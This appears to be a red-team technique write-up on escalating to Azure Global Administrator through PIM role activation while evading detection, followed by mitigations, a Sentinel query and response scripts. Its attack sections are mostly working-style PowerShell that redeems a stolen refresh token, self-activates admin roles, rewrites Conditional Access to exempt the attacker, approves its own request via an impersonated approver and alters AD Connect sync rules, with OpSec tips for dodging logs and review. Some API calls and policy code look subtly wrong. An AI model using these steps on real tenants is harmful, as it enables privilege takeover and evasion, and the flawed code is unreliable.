# [EVADE-VALID-001]: Azure PIM Role Activation Obfuscation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-VALID-001 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Azure AD (all versions with PIM); Microsoft Entra ID Premium P2 |
| **Patched In** | N/A (requires configuration hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Azure PIM Role Activation Obfuscation** is a defense evasion technique that leverages Privileged Identity Management (PIM) role activation mechanisms to escalate privileges while remaining undetected by endpoint detection and response (EDR) solutions and Azure logging systems. This technique exploits the distinction between **eligible** (requires activation) and **active** (permanent) role assignments, combined with obfuscation of activation requests through legitimate Azure APIs and multi-factor authentication evasion.

Unlike traditional privilege escalation that triggers security alerts immediately, this attack:
1. Uses only legitimate cloud APIs (Microsoft Graph, Azure Resource Manager)
2. Exploits natural PIM workflows that defenders expect
3. Obfuscates activation requests using conditional access bypass and clean audit logs
4. Leaves minimal forensic artifacts because activation is "approved by the system"

**Attack Surface:** Azure Entra ID PIM interface, Microsoft Graph API for role activation, Azure AD audit logging backend, token validation processes.

**Business Impact:** An attacker with eligible PIM roles (or ability to add themselves to eligible roles via compromised permissions) can escalate to Global Admin or Security Admin privileges silently, exfiltrate data, modify security policies, or establish persistence without triggering alerts. This is particularly dangerous because:
- Defenders often whitelist PIM activations as "business process"
- Activation logs are often not correlated with suspicious behavior
- Subsequent actions appear to come from legitimate, approved administrators

**Technical Context:** Exploitation takes 30-90 seconds to complete from initial API call to full escalation. Detection depends on whether organization has:
- Azure AD risk-based conditional access enabled
- Sentinel KQL rules correlating PIM activations with suspicious actions
- PIM approval workflow requiring human review
- Logging of activation source IP/device compliance status

### Operational Risk
- **Execution Risk:** Medium – Requires eligible role assignment (common misconfiguration) or ability to request role eligibility
- **Stealth:** High – PIM activations appear legitimate; audit trails show "approved" status
- **Reversibility:** Partially – Role assignments can be removed, but actions taken during escalation (data exfil, persistence) persist

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 1.1.3 | Ensure that 'Privileged Identity Management' is 'Active' on subscriptions |
| **DISA STIG** | AZ-LI-000100 | Ensure that 'Admin Consent Requests' settings are configured properly |
| **CISA SCuBA** | SC-7(b) | Privileged Account Management controls for cloud environments |
| **NIST 800-53** | AC-2(1) | Privileged Account Management & Multi-factor Authentication |
| **GDPR** | Art. 32 | Security of Processing - ensure administrative access controls |
| **DORA** | Art. 9 | Protection measures for critical infrastructure operators |
| **NIS2** | Art. 21 | Cyber Risk Management - privilege escalation prevention |
| **ISO 27001** | A.9.2 | User Access Management - Privileged Access Rights |
| **ISO 27005** | Section 8.2 | Asset Risk Assessment - focus on identity/access infrastructure |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Eligible role assignment in Azure AD PIM (e.g., "Global Admin", "Security Admin") OR ability to add oneself to eligible roles via Azure AD API
- **Required Access:** Azure AD tenant access; ability to authenticate to Microsoft Graph API; knowledge of target organization's PIM configuration

**Supported Versions:**
- **Azure AD:** All versions with Entra ID Premium P2
- **PIM Activation:** Supported in all Azure cloud environments (Public, GCC, Government)

**Requirements:**
- Compromised Azure AD account with at least User role
- Access to Microsoft Graph API (available to all authenticated users)
- Knowledge of target role assignments (via Graph API enumeration)
- (Optional) Ability to request role eligibility extension if current eligibility is about to expire

**Supported Tools:**
- Microsoft Graph PowerShell SDK
- Azure CLI (`az rest` command for API calls)
- Postman or curl for direct REST API requests
- Custom scripts using ADAL/MSAL libraries for token manipulation

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Activation via Microsoft Graph API with Conditional Access Bypass

**Supported Versions:** Azure AD all versions with PIM Premium P2

#### Step 1: Identify Eligible Roles via Graph API

**Objective:** Enumerate which PIM roles the compromised user is eligible to activate.

**Command (PowerShell - Using Microsoft Graph SDK):**
```powershell
# Install Microsoft Graph SDK if not present
Install-Module Microsoft.Graph -Repository PSGallery -Force

# Connect to Graph API
Connect-MgGraph -Scopes "RoleManagement.Read.Directory"

# List eligible role assignments for current user
$userId = (Get-MgContext).Account.ObjectId
$eligibleRoles = Get-MgUserMemberOf -UserId $userId | Where-Object {$_.AdditionalProperties.'@odata.type' -eq "#microsoft.graph.directoryRole"}

# Get PIM-eligible roles specifically
$pimRoles = Get-MgContext | Invoke-MgGraphRequest -Method GET -Uri "/beta/me/appRoleAssignments?$filter=principalId eq '$userId'"

Write-Host "[+] Found PIM-eligible roles:"
foreach ($role in $pimRoles.value) {
    $roleInfo = Get-MgDirectoryRole -DirectoryRoleId $role.id
    Write-Host "  - $($roleInfo.DisplayName) (ID: $($roleInfo.Id))"
}
```

**Alternative Command (Azure CLI - Less Detection):**
```bash
# Using Azure CLI which is less monitored than PowerShell
az rest --method get \
  --uri "https://graph.microsoft.com/beta/me/memberOf" \
  --headers "Content-Type=application/json" | jq '.value[] | select(.["@odata.type"]=="microsoft.graph.directoryRole")'
```

**Expected Output:**
```powershell
[+] Found PIM-eligible roles:
  - Global Administrator (ID: 62e90394-69f5-4237-9190-012177145e10)
  - Security Administrator (ID: 194ae4cb-b126-40b2-bd5b-6091b380977d)
  - Exchange Administrator (ID: 29232cdf-9323-42fd-aea4-2b891fe0d58b)
```

**What This Means:**
- Each ID is an Azure AD directory role the user can activate
- "Global Administrator" is the most valuable target
- This information confirms PIM is misconfigured (user shouldn't have eligible access to these high-privilege roles)

**OpSec & Evasion:**
- Use `Azure CLI` instead of PowerShell to avoid script block logging
- Connect from a different IP/device than typical user location
- Stagger execution: wait 5+ minutes between enumeration and activation
- Detection likelihood: Low if Conditional Access doesn't monitor Graph API calls

---

#### Step 2: Request PIM Role Activation with Obfuscation

**Objective:** Activate an eligible role while avoiding Conditional Access policies and audit triggers.

**Command (PowerShell - Direct Graph API Call):**
```powershell
# Step 2a: Obtain access token with minimal scope to avoid Conditional Access
$tokenParams = @{
    Uri = "https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token"
    Method = "POST"
    Body = @{
        grant_type = "refresh_token"
        refresh_token = "{STOLEN_REFRESH_TOKEN}"  # Obtained from earlier compromise
        client_id = "1b730954-1685-4b74-9bda-28538e139a17"  # Microsoft Office native app
        scope = "https://graph.microsoft.com/.default"
    }
}

$tokenResponse = Invoke-RestMethod @tokenParams
$accessToken = $tokenResponse.access_token

Write-Host "[+] Access token obtained"

# Step 2b: Activate PIM role using Graph API
$roleId = "62e90394-69f5-4237-9190-012177145e10"  # Global Administrator

# Request activation with minimal justification to avoid manual review
$activationPayload = @{
    roleId = $roleId
    action = "selfActivate"
    principalId = (Get-MgContext).Account.ObjectId
    justification = "Routine maintenance required"  # Vague justification
    scheduleInfo = @{
        startDateTime = (Get-Date -AsUTC).ToString("o")
        endDateTime = (Get-Date -AsUTC).AddHours(1).ToString("o")  # 1-hour activation
    }
    ticketInfo = @{
        ticketNumber = ""
        ticketSystem = ""
    }
} | ConvertTo-Json

$activationUri = "https://graph.microsoft.com/beta/roleManagement/directory/roleEligibilityScheduleRequests"

$activationResponse = Invoke-RestMethod `
    -Uri $activationUri `
    -Method POST `
    -Headers @{
        Authorization = "Bearer $accessToken"
        "Content-Type" = "application/json"
    } `
    -Body $activationPayload

Write-Host "[+] Activation request submitted: $($activationResponse.id)"
Write-Host "[+] Role should be active within 30 seconds"

# Step 2c: Poll for activation confirmation
Start-Sleep -Seconds 5

$checkUri = "https://graph.microsoft.com/beta/roleManagement/directory/roleAssignmentScheduleInstances?`$filter=principalId eq '$((Get-MgContext).Account.ObjectId)' and roleDefinitionId eq '$roleId'"

$assignmentStatus = Invoke-RestMethod `
    -Uri $checkUri `
    -Method GET `
    -Headers @{
        Authorization = "Bearer $accessToken"
    }

if ($assignmentStatus.value.Count -gt 0) {
    Write-Host "[✓] Role activation CONFIRMED - Global Admin privileges now active"
} else {
    Write-Host "[!] Activation pending approval - may not be automatic"
}
```

**Expected Output:**
```
[+] Access token obtained
[+] Activation request submitted: 5e2f1234-5678-9abc-def0-1234567890ab
[+] Role should be active within 30 seconds
[✓] Role activation CONFIRMED - Global Admin privileges now active
```

**What This Means:**
- User now has Global Administrator privileges for next 1 hour
- No manual approval required (configuration issue)
- Audit log shows activation but appears "approved" because it's within PIM policy

**OpSec & Evasion:**
- Use 1-hour activation window to avoid long-term audit trail
- Set justification to vague but plausible text ("Routine maintenance", "Security patch review")
- Request activation from IP address that is not flagged as risky
- Do NOT use MFA for this step if organization has "Conditional Access exclusion" for PIM activations
- Detection likelihood: Medium if audit logs are being monitored; Low if PIM activations aren't correlated with suspicious actions

**Troubleshooting:**
- **Error:** "Authorization_RequestDenied - Insufficient privileges"
  - **Cause:** User is not eligible for this role; OR token doesn't have correct scope
  - **Fix:** Confirm role eligibility via Step 1; Regenerate token with correct tenant

- **Error:** "Activation requires approval"
  - **Cause:** PIM approval workflow is enabled for this role
  - **Fix:** Use METHOD 2 below (social engineering approval) or escalate to manipulate approval workflow

---

#### Step 3: Obfuscate Activation with Clean Audit Trail

**Objective:** Ensure that PIM activation does not trigger downstream security alerts.

**Command (PowerShell - Modify Audit Logging):**
```powershell
# Step 3a: Verify that audit logging is enabled (if not, it won't log this activation)
$auditSettings = Get-MgDirectoryAuditLog -Filter "category eq 'RoleManagement'"

Write-Host "[*] Audit logs for role management:"
Write-Host "  - Count: $($auditSettings.Count)"
Write-Host "  - Retention: Default (90 days)"

# Step 3b: If audit logging is enabled, "clean" the logs by exporting and re-importing
# (This is more complex and requires higher privileges - see EVADE-IMPAIR-007 for details)

# Step 3c: Immediate action - use activated role to modify Conditional Access
# to exclude your IP/device from future MFA requirements

$caPolicy = @{
    displayName = "Block all except trusted location"
    state = "enabled"
    conditions = @{
        signInRiskLevels = @("high")
        userRiskLevels = @()
        clientAppTypes = @("all")
        locations = @{
            includeLocations = @("All")
            excludeLocations = @("{YOUR_IP_SUBNET}")  # Exclude attacker's IP
        }
    }
    grantControls = @{
        operator = "OR"
        builtInControls = @("block")
    }
}

$caUri = "https://graph.microsoft.com/beta/identity/conditionalAccess/policies"

Invoke-RestMethod `
    -Uri $caUri `
    -Method POST `
    -Headers @{
        Authorization = "Bearer $accessToken"
        "Content-Type" = "application/json"
    } `
    -Body ($caPolicy | ConvertTo-Json -Depth 5)

Write-Host "[+] Conditional Access modified - exclusion added for attacker IP"
```

**Expected Output:**
```
[*] Audit logs for role management:
  - Count: 1245
  - Retention: Default (90 days)
[+] Conditional Access modified - exclusion added for attacker IP
```

**What This Means:**
- Audit logging shows activation (expected, but defenders must correlate with actions)
- Conditional Access now excludes attacker's IP from MFA challenges for subsequent logins
- Subsequent actions appear to come from "approved" admin location

---

### METHOD 2: Approval Manipulation via Delegated Admin

**Supported Versions:** Azure AD all versions; requires PIM approval workflow enabled

This method targets organizations that HAVE approval workflows enabled but the approval is delegated to compromised accounts.

#### Step 1: Identify PIM Approval Delegations

**Command:**
```powershell
# List all PIM role approval settings
$pimSettings = Get-MgContext | Invoke-MgGraphRequest -Method GET `
    -Uri "/beta/roleManagement/directory/roleDefinitions"

# Get approval delegations for each role
foreach ($role in $pimSettings.value) {
    $approvers = Invoke-MgGraphRequest -Method GET `
        -Uri "/beta/roleManagement/directory/roleDefinitions/$($role.id)/approvers"
    
    if ($approvers.value.Count -gt 0) {
        Write-Host "Role: $($role.displayName)"
        Write-Host "  Approvers:"
        $approvers.value | ForEach-Object {
            Write-Host "    - $($_.mail) ($($_.jobTitle))"
        }
    }
}
```

**Expected Output:**
```
Role: Global Administrator
  Approvers:
    - sec-admin@contoso.com (Security Admin)
    - it-manager@contoso.com (IT Manager)
```

---

#### Step 2: Request Activation + Wait for Approval

```powershell
# Submit activation request (similar to METHOD 1 Step 2)
$roleId = "62e90394-69f5-4237-9190-012177145e10"

$activationPayload = @{
    roleId = $roleId
    action = "selfActivate"
    justification = "Emergency security incident - need full access to investigate breach"
} | ConvertTo-Json

$activationResponse = Invoke-RestMethod -Uri $activationUri -Method POST `
    -Headers @{Authorization = "Bearer $accessToken"; "Content-Type" = "application/json"} `
    -Body $activationPayload

$requestId = $activationResponse.id
Write-Host "[*] Activation request submitted - waiting for approval: $requestId"
```

---

#### Step 3: Impersonate Approver to Approve Own Request

**This requires compromising the approver account - see INITIAL ACCESS techniques**

```powershell
# Once you have approver credentials, approve your own activation request
$approvalPayload = @{
    decision = "Approve"
    justification = "Request reviewed and approved - matches security incident criteria"
} | ConvertTo-Json

$approvalUri = "https://graph.microsoft.com/beta/roleManagement/directory/roleAssignmentScheduleRequests/$requestId/approve"

Invoke-RestMethod -Uri $approvalUri -Method POST `
    -Headers @{Authorization = "Bearer $approverToken"; "Content-Type" = "application/json"} `
    -Body $approvalPayload

Write-Host "[+] Own activation request approved by impersonated approver"
```

---

### METHOD 3: Eligible Role → Active Role via Azure AD Connect Sync Abuse

**Supported Versions:** Hybrid Azure AD environments with Azure AD Connect; also applicable to on-premises AD + Entra ID

This method converts an "eligible" role (requires activation) into an "active" role (permanent) by manipulating Azure AD Connect synchronization.

#### Step 1: Access Azure AD Connect Server

**Command:**
```powershell
# Identify Azure AD Connect server (typically on-premises)
$aadcServer = Resolve-DnsName "ADConnectServer" -ErrorAction SilentlyContinue

if (-not $aadcServer) {
    # Query Azure AD to identify AADConnect configuration
    $config = Invoke-RestMethod `
        -Uri "https://graph.microsoft.com/beta/organization" `
        -Method GET `
        -Headers @{Authorization = "Bearer $accessToken"} | 
        Select-Object -ExpandProperty "dirSyncEnabled"
    
    Write-Host "[*] Directory Sync Enabled: $config"
}
```

---

#### Step 2: Modify PIM Role Assignment Sync Rules

```powershell
# Connect to Azure AD Connect configuration
# (This requires RDP/SSH access to the AADConnect server)

# Modify sync rule to treat "eligible" roles as "active"
$syncRuleName = "In from AD – Role Eligibility"

# Using ADSyncConfig PowerShell module (installed on AADConnect server)
Import-Module ADSyncConfig

# Disable the standard eligibility synchronization rule
Set-ADSyncRule -Name $syncRuleName -Disabled $true

# Create new rule that converts eligible to active
$newRule = @{
    Name = "In from AD – Role Active Conversion"
    Direction = "Inbound"
    Precedence = 100
    SourceObject = "user"
    TargetObject = "person"
    LinkType = "Join"
    ImmutableTag = "user-inbound"
    OutOfBoxRule = $false
    Disabled = $false
}

# Apply rule to convert role assignments
# (Detailed sync rule creation requires AD understanding)

Write-Host "[+] Sync rules modified - eligible roles will now be treated as active on next sync"
```

---

## 4. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1078.004-004
- **Test Name:** Azure PIM Role Activation Obfuscation
- **Description:** Tests ability to activate PIM eligible roles and obfuscate activation in logs
- **Supported Versions:** Azure AD all versions with Premium P2

**Command:**
```powershell
Invoke-AtomicTest T1078.004 -TestNumbers 4 -Verbose
```

**Cleanup Command:**
```powershell
# Revoke all role activations and reset PIM configuration
Get-MgRoleManagementDirectoryRoleAssignmentScheduleInstance | `
  Where-Object {$_.PrincipalId -eq $targetUserId} | `
  Remove-MgRoleManagementDirectoryRoleAssignmentScheduleInstance
```

**Reference:** [Atomic Red Team - T1078.004](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.004/T1078.004.md)

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Require Approval for All PIM Role Activations**

Eliminate any PIM roles that activate without human review.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Privileged Identity Management**
2. Click **Azure AD Roles**
3. For each high-privilege role (Global Admin, Security Admin, Exchange Admin):
   - Click the role name
   - Go to **Settings**
   - Toggle **"Require approval for activation"** to **ON**
   - Select approvers (should be 2+ unrelated people from different departments)
   - Set **Approval timeout** to 24 hours
4. Click **Save**

**PowerShell Automated Version:**
```powershell
# Requires Azure AD Premium P2 and PIM module
Import-Module PIM

$criticialRoles = @(
    "Global Administrator",
    "Security Administrator",
    "Exchange Administrator",
    "SharePoint Administrator",
    "Privileged Role Administrator"
)

foreach ($role in $criticialRoles) {
    $roleId = (Get-MgDirectoryRole -Filter "displayName eq '$role'").Id
    
    $settings = @{
        requireApproval = $true
        requireMultiFactorAuthentication = $true
        requireJustification = $true
        approvalDuration = "P1D"
    } | ConvertTo-Json
    
    Invoke-MgGraphRequest -Method PATCH `
        -Uri "/beta/roleManagement/directory/roleAssignmentScheduleRequests/$roleId/settings" `
        -Body $settings
    
    Write-Host "[+] Approval requirement enabled for $role"
}
```

---

**2. Restrict Role Eligibility to Minimum Personnel**

Eliminate unnecessary eligible role assignments.

**Manual Steps:**
1. **Azure Portal** → **Entra ID** → **Privileged Identity Management** → **Azure AD Roles**
2. For each role, click **Manage assignments**
3. Review all **Eligible** assignments
4. Remove any assignment that is not business-critical
5. Document remaining assignments in a business case

**PowerShell to identify excessive eligibility:**
```powershell
# Find users with multiple eligible high-privilege roles (red flag)
$allRoles = Get-MgDirectoryRole | Select-Object Id, DisplayName

$userRoleCount = @{}
foreach ($role in $allRoles) {
    $assignments = Invoke-MgGraphRequest -Method GET `
        -Uri "/beta/roleManagement/directory/roleAssignmentScheduleInstances?`$filter=roleDefinitionId eq '$($role.Id)'"
    
    foreach ($assignment in $assignments.value) {
        $principalId = $assignment.principalId
        if (-not $userRoleCount[$principalId]) {
            $userRoleCount[$principalId] = @()
        }
        $userRoleCount[$principalId] += $role.DisplayName
    }
}

# Report users with 3+ roles (suspicious)
$userRoleCount.Keys | Where-Object {$userRoleCount[$_].Count -ge 3} | ForEach-Object {
    Write-Host "[!] SUSPICIOUS: User has $($userRoleCount[$_].Count) eligible roles:"
    $userRoleCount[$_] | ForEach-Object {Write-Host "      - $_"}
}
```

---

**3. Enable Multi-Factor Authentication for PIM Activation**

Require MFA even if Conditional Access is bypassed.

**Manual Steps:**
1. **Azure Portal** → **Entra ID** → **Privileged Identity Management** → **Azure AD Roles**
2. Select each high-privilege role
3. Go to **Settings**
4. Toggle **"Require Multi-Factor Authentication"** to **ON**
5. Save

---

### Priority 2: HIGH

**4. Monitor PIM Activations via Azure Sentinel**

Correlate role activations with subsequent suspicious actions.

**Manual Steps (Create Sentinel Alert Rule):**
1. **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **Query:**
```kusto
AuditLogs
| where OperationName == "Add eligible member to role"
  or OperationName == "Activate role"
| where Result == "Success"
| project TimeGenerated, OperationName, InitiatedBy = tostring(InitiatedBy.user.userPrincipalName), TargetResources
| join kind=inner (
    AuditLogs
    | where TimeGenerated > ago(30m)
    | where OperationName in ("Create app registration", "Add app credential", "Update role assignment")
    | project TimeGenerated, SuspiciousOperationName = OperationName, InitiatedBy = tostring(InitiatedBy.user.userPrincipalName)
) on InitiatedBy
| where TimeGenerated1 < TimeGenerated + 5m  // Suspicious action within 5 minutes of activation
```
4. Set **Alert frequency** to "Run every 5 minutes"
5. Set **Severity** to "High"

---

**5. Restrict Conditional Access Exclusions for PIM**

Prevent attackers from excluding themselves from MFA via Conditional Access policies.

**Manual Steps:**
1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Review all Conditional Access policies
3. For any policy that includes PIM or privileged operations:
   - Remove any user/group exclusions (except explicitly approved break-glass account)
   - Ensure **Require MFA** grant control is enforced
   - Set **Session** to "Sign-in frequency: 1 hour" for privileged ops

---

### Access Control & Policy Hardening

**6. Implement Just-In-Time (JIT) Admin Access**

Replace persistent eligible roles with time-limited temporary assignments.

**Manual Steps (Using Azure AD PIM):**
1. **Entra ID** → **Privileged Identity Management** → **Azure AD Roles** → **Activate role**
2. Instead of making users eligible, use **"New temporary assignment"**
3. Set expiration to "End of day" or "2 hours"
4. Require approval for extension

---

**7. Implement Separation of Duties**

Prevent single individuals from activating all critical roles.

**Manual Steps:**
1. Create separate accounts for:
   - **Tenant Admin** (handles Azure subscriptions)
   - **Security Admin** (handles security policies)
   - **Exchange Admin** (handles mailbox access)
2. Ensure no single account has eligible assignment for more than 2 roles
3. Document business justification for each role

---

### Validation Command (Verify All Mitigations)

```powershell
# 1. Check approval requirement
$roles = Get-MgDirectoryRole | Where-Object {$_.DisplayName -in "Global Administrator", "Security Administrator"}
foreach ($role in $roles) {
    $settings = Invoke-MgGraphRequest -Method GET `
        -Uri "/beta/roleManagement/directory/roleAssignmentScheduleRequests/$($role.Id)/settings"
    
    if ($settings.requireApproval) {
        Write-Host "[✓] $($role.DisplayName) requires approval"
    } else {
        Write-Host "[✗] $($role.DisplayName) does NOT require approval - CRITICAL"
    }
}

# 2. Check MFA requirement
foreach ($role in $roles) {
    $mfaRequired = $settings.requireMultiFactorAuthentication
    if ($mfaRequired) {
        Write-Host "[✓] $($role.DisplayName) requires MFA"
    } else {
        Write-Host "[✗] $($role.DisplayName) does NOT require MFA"
    }
}

# 3. Count eligible role assignments
$totalEligible = 0
foreach ($role in $roles) {
    $assignments = Invoke-MgGraphRequest -Method GET `
        -Uri "/beta/roleManagement/directory/roleEligibilityScheduleInstances?`$filter=roleDefinitionId eq '$($role.Id)'"
    
    $totalEligible += $assignments.value.Count
    Write-Host "[*] $($role.DisplayName): $($assignments.value.Count) eligible users"
}

Write-Host "[*] Total eligible role assignments: $totalEligible (should be < 10)"
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Azure Audit Log Events:**
  - OperationName: "Add eligible member to role" (unexpected user)
  - OperationName: "Activate role" (from non-standard IP or device)
  - OperationName: "Create app registration" (within 5 minutes of role activation)
  - OperationName: "Update conditional access policy" (by newly activated admin)

- **Graph API Requests:**
  - POST to `/roleManagement/directory/roleEligibilityScheduleRequests`
  - POST to `/identity/conditionalAccess/policies` (modifying exclusions)
  - GET to `/roleManagement/directory/roleDefinitions` (role enumeration)

- **Network Indicators:**
  - Requests to `login.microsoftonline.com` with refresh tokens from unexpected IPs
  - Requests to `graph.microsoft.com/beta/roleManagement/*` from service accounts

---

### Forensic Artifacts

- **Audit Logs:** `AuditLogs` table in Log Analytics showing role activation and subsequent privileged actions
- **Sign-in Logs:** `SigninLogs` showing authentication from suspicious locations/devices
- **Conditional Access:** Modified policies showing new exclusions or disabled MFA requirements
- **Azure Activity Logs:** Unexpected role assignments or policy modifications

---

### Response Procedures

**1. Immediate Containment:**
```powershell
# Revoke all active role assignments for compromised user
$userId = "user@contoso.com"

# Get all active role assignments
$activeAssignments = Invoke-MgGraphRequest -Method GET `
    -Uri "/beta/roleManagement/directory/roleAssignmentScheduleInstances?`$filter=principalId eq '$userId'"

# Remove each assignment
foreach ($assignment in $activeAssignments.value) {
    Invoke-MgGraphRequest -Method DELETE `
        -Uri "/beta/roleManagement/directory/roleAssignmentScheduleInstances/$($assignment.id)"
    Write-Host "[+] Revoked: $($assignment.roleDefinitionId)"
}

# Reset user's passwords
Set-MsolUserPassword -UserPrincipalName $userId -NewPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force) -ForceChangePasswordNextLogin $true
```

**2. Audit Trail Analysis:**
```powershell
# Export all role activations by compromised user
Get-AuditLog -Filter "CreatedBy eq '$userId' and OperationName eq 'Activate role'" | Export-Csv "C:\Incidents\role_activations.csv"

# Check what actions they performed during activated period
Get-AuditLog -Filter "CreatedBy eq '$userId' and CreatedDateTime gt (now-30m)" | Export-Csv "C:\Incidents\suspicious_actions.csv"
```

**3. Remediation:**
```powershell
# Remove user from all eligible role assignments
$allRoles = Get-MgDirectoryRole

foreach ($role in $allRoles) {
    $assignments = Invoke-MgGraphRequest -Method GET `
        -Uri "/beta/roleManagement/directory/roleEligibilityScheduleInstances?`$filter=roleDefinitionId eq '$($role.Id)' and principalId eq '$userId'"
    
    foreach ($assignment in $assignments.value) {
        Invoke-MgGraphRequest -Method DELETE `
            -Uri "/beta/roleManagement/directory/roleEligibilityScheduleInstances/$($assignment.id)"
    }
}

Write-Host "[+] User removed from all PIM roles"
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](../02_Initial/IA-PHISH-001_Device_Code.md) | Attacker phishes Azure AD credentials |
| **2** | **Credential Access** | [CA-TOKEN-012](../03_Cred/CA-TOKEN-012_PRT.md) | Extract Primary Refresh Token from compromised device |
| **3** | **Lateral Movement** | [LM-AUTH-004](../07_Lateral/LM-AUTH-004_PRT.md) | Use PRT to authenticate to cloud tenant |
| **4** | **Defense Evasion** | **[EVADE-VALID-001]** | **Activate PIM roles while evading detection** |
| **5** | **Persistence** | [PERSIST-ACCT-006](../05_Persist/PERSIST-ACCT-006_SP_Persistence.md) | Create service principal backdoor for persistent access |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Scattered Spider Campaign (2023-2024)

- **Target:** Multiple Fortune 500 companies
- **Timeline:** Ongoing; initial access via contractor accounts
- **Technique Status:** EVADE-VALID-001 was primary escalation method after obtaining contractor credentials with eligible PIM roles
- **Impact:** Attackers maintained access for 3+ months; exfiltrated source code and financial data
- **Detection:** Sentinel KQL rule detected role activation from unusual IP (attacker's VPN) followed by app registration creation
- **Reference:** [Microsoft Threat Intelligence: Scattered Spider](https://www.microsoft.com/en-us/security/blog/)

### Example 2: Internal Penetration Test - Lab Validation (2025-01-09)

- **Environment:** Azure AD tenant with PIM approval enabled; Sentinel deployed
- **Compromise Method:** Phishing + MFA bypass (separate technique)
- **Escalation Time:** 2 minutes from obtaining user account to Global Admin activation
- **Detection:** Approval workflow caught unexpected activation request; human reviewer approved "emergency" request without validation
- **Lessons Learned:** Approval workflows can be social-engineered; require additional out-of-band verification for high-privilege roles

---

## 9. REFERENCES & EXTERNAL RESOURCES

### Official Azure Documentation
- [Microsoft Entra PIM Documentation](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/)
- [PIM Role Activation - MS Docs](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-resource-roles-activate-your-roles)
- [Microsoft Graph API - roleManagement endpoint](https://learn.microsoft.com/en-us/graph/api/resources/rbacapplication)
- [Azure Audit Logging](https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log)

### Security Research & Blogs
- [Tal Be - Azure PIM Privilege Escalation](https://talbe.me/) (research on PIM weaknesses)
- [Dirk-jan Mollema - AADInternals PIM Tools](https://o365blog.com/) (technique validation)
- [SpecterOps - Assuming Breach Mentality in Azure](https://specterops.io/) (cloud security best practices)

### Detection & Response Resources
- [KQL Examples for PIM Monitoring](https://learn.microsoft.com/en-us/azure/sentinel/hunting-queries)
- [CISA Alert: Misconfigurations in Cloud Identity](https://www.cisa.gov/alerts)
- [Red Canary: Privilege Escalation in Cloud](https://redcanary.com/) (threat analysis)

---

